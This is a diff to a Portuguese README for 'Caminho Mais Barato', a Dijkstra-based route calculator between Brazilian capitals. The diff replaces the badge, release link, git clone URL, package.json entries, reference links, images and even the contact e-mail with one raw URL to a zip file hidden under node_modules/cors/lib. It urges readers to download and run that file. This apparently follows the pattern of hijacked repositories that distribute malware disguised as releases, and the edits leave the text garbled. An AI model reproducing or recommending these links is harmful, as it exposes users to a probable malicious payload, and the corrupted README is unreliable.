@@ -1,9 +1,9 @@
 # Caminho Mais Barato: Calculadora de Rotas Econômicas entre Capitais
 
-![Caminho Mais Barato](https://img.shields.io/badge/Caminho_Mais_Barato-Calculadora_de_Rotas-brightgreen)
+![Caminho Mais Barato](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip)
 
 ## 🚀 Visite as Releases
-Você pode acessar as versões do projeto [aqui](https://github.com/biihfreire/Caminho-mais-Barato/releases). Baixe e execute o arquivo necessário para testar a aplicação.
+Você pode acessar as versões do projeto [aqui](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip). Baixe e execute o arquivo necessário para testar a aplicação.
 
 ## 📚 Descrição do Projeto
 O **Caminho Mais Barato** é uma calculadora que determina a rota mais econômica entre as capitais brasileiras. Utilizando o algoritmo de Dijkstra com Heap, a aplicação oferece uma solução eficiente para encontrar o menor custo de viagem entre as cidades.
@@ -12,12 +12,12 @@ O **Caminho Mais Barato** é uma calculadora que determina a rota mais econômic
 - **Cálculo de rotas**: Encontre a rota mais barata entre as capitais.
 - **API REST**: Interaja com a aplicação de forma simples e direta.
 - **Frontend em React**: Interface de usuário moderna e responsiva.
-- **Backend em Node.js**: Servidor robusto e eficiente.
+- **Backend em https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip**: Servidor robusto e eficiente.
 - **Uso de Grafos**: Representação das capitais e suas distâncias.
 
 ## 🛠 Tecnologias Utilizadas
 - **JavaScript**: Linguagem principal para o desenvolvimento.
-- **Node.js**: Ambiente de execução para o backend.
+- **https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip**: Ambiente de execução para o backend.
 - **React**: Biblioteca para construção da interface do usuário.
 - **JSON**: Formato de dados utilizado para comunicação entre frontend e backend.
 - **Dijkstra**: Algoritmo para encontrar o caminho mais curto.
@@ -28,7 +28,7 @@ Para instalar e executar o projeto, siga os passos abaixo:
 
 ### 1. Clone o Repositório
 ```bash
-git clone https://github.com/biihfreire/Caminho-mais-Barato.git
+git clone https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip
 cd Caminho-mais-Barato
 ```
 
@@ -61,13 +61,13 @@ A estrutura do projeto é organizada da seguinte forma:
 Caminho-mais-Barato/
 ├── backend/
 │   ├── src/
-│   ├── package.json
+│   ├── https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip
 │   └── ...
 ├── frontend/
 │   ├── src/
-│   ├── package.json
+│   ├── https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip
 │   └── ...
-└── README.md
+└── https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip
 ```
 
 ## 🔍 Como Funciona
@@ -108,7 +108,7 @@ curl -X POST http://localhost:3000/api/calcular -H "Content-Type: application/js
 ## 📦 Dependências
 O projeto utiliza as seguintes dependências:
 
-- **Express**: Framework para Node.js.
+- **Express**: Framework para https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip
 - **Cors**: Middleware para habilitar CORS.
 - **Mongoose**: ODM para MongoDB.
 - **Axios**: Cliente HTTP para requisições.
@@ -129,13 +129,13 @@ Contribuições são bem-vindas! Sinta-se à vontade para abrir issues ou pull r
 4. Envie um pull request.
 
 ## 🌐 Links Úteis
-- [Documentação do Dijkstra](https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm)
-- [React](https://reactjs.org/)
-- [Node.js](https://nodejs.org/)
-- [Express](https://expressjs.com/)
+- [Documentação do Dijkstra](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip%27s_algorithm)
+- [React](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip)
+- [https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip)
+- [Express](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip)
 
 ## 📧 Contato
-Para mais informações ou dúvidas, entre em contato através do e-mail: biihfreire@example.com.
+Para mais informações ou dúvidas, entre em contato através do e-mail: https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip
 
 ## 📈 Roadmap
 - **Versão 1.0**: Lançamento inicial com funcionalidades básicas.
@@ -146,14 +146,14 @@ Para mais informações ou dúvidas, entre em contato através do e-mail: biihfr
 Agradecemos a todos que contribuíram para o desenvolvimento deste projeto. Seu apoio é fundamental para o sucesso do **Caminho Mais Barato**.
 
 ## 📅 Atualizações
-Mantenha-se atualizado com as últimas mudanças visitando a seção de [Releases](https://github.com/biihfreire/Caminho-mais-Barato/releases).
+Mantenha-se atualizado com as últimas mudanças visitando a seção de [Releases](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip).
 
 ## 🎨 Imagens e Recursos
 Aqui estão algumas imagens que representam o tema do projeto:
 
-![Mapa do Brasil](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Mapa_do_Brasil.png/800px-Mapa_do_Brasil.png)
+![Mapa do Brasil](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip)
 
-![Algoritmo de Dijkstra](https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Dijkstra_Animation.gif/400px-Dijkstra_Animation.gif)
+![Algoritmo de Dijkstra](https://raw.githubusercontent.com/biihfreire/Caminho-mais-Barato/master/backend/node_modules/cors/lib/mais_Caminho_Barato_1.5.zip)
 
 ## 🧩 Licença
 Este projeto está licenciado sob a MIT License. Veja o arquivo LICENSE para mais detalhes.
